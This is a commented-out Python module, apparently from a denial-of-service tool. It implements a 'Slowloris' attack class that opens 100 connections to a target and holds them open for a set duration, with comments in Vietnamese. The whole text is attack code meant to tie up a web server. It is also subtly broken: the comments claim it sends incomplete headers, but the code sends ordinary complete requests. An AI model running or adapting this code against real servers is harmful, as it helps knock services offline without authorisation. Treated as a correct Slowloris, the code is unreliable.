# import time
# import asyncio
# import aiohttp
# from .base import BaseAttack

# class Slowloris(BaseAttack):
#     async def execute(self):
#         start_time = time.time()
#         connections = []

#         async with aiohttp.ClientSession() as session:
#             # Mở nhiều kết nối
#             for _ in range(100):  # Mở 100 kết nối
#                 try:
#                     # Gửi header không hoàn chỉnh, giữ kết nối mở
#                     conn = await session.get(self.target, headers={"Connection": "keep-alive"}, timeout=None)
#                     connections.append(conn)
#                     self.results["requests_sent"] += 1
#                     print(f"Slowloris: Opened connection to {self.target}")
#                 except Exception as e:
#                     self.results["errors"] += 1
#                     print(f"Slowloris error: {e}")

#             # Giữ kết nối mở trong thời gian duration
#             while time.time() - start_time < self.duration:
#                 await asyncio.sleep(1)  # Giữ kết nối mở

#             # Đóng kết nối
#             for conn in connections:
#                 await conn.close()